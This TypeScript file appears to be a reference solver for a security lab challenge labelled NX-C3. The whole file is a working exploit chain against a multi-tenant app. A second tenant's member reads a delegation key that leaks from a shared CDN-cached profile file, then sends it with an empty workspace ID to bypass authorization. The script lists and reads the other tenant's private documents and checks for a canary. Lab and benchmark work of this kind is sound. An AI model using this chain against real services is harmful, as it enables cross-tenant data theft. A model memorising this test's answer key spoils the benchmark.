// NX-C3 reference solver: profile cache authorization omission -> cached delegation key ->
// empty workspace fallback -> private document read.
import type { CompositeProofReceipt } from '../../../lib/types.ts'
import type { SolverContext } from './context.ts'

export async function solveC3(ctx: SolverContext): Promise<CompositeProofReceipt | null> {
  const plan = ctx.lab.plan
  const prefix = plan.routePrefix
  const slug = plan.tenants.a.slug
  const owner = await ctx.login('owner_a')
  await ctx.http('cdn', `/public/profile/${slug}.css`, { token: owner })

  const member = await ctx.login('member_b')
  const served = await ctx.http('cdn', `/public/profile/${slug}.css`, { token: member })
  const delegationKey = served.headers['x-delegation-key']
  if (!delegationKey) return null

  const listing = await ctx.http('api', `${prefix}/docs`, {
    token: member,
    headers: { 'x-delegation-key': delegationKey, 'x-workspace-id': '' },
  })
  if (listing.status !== 200) return null
  const docId = listing.json<{ docs: Array<{ id: string }> }>().docs[0]?.id
  if (!docId) return null

  await ctx.http('api', `${prefix}/docs/${docId}/content`, { token: member })

  const opened = await ctx.http('api', `${prefix}/docs/${docId}`, {
    token: member,
    headers: { 'x-delegation-key': delegationKey, 'x-workspace-id': '' },
  })
  if (opened.status !== 200) return null

  const content = await ctx.http('api', `${prefix}/docs/${docId}/content`, {
    token: member,
    headers: { 'x-delegation-key': delegationKey, 'x-workspace-id': '' },
  })
  if (content.status !== 200 || !content.text.includes(plan.nexus.canary)) return null

  return ctx.confirm('NX-C3')
}
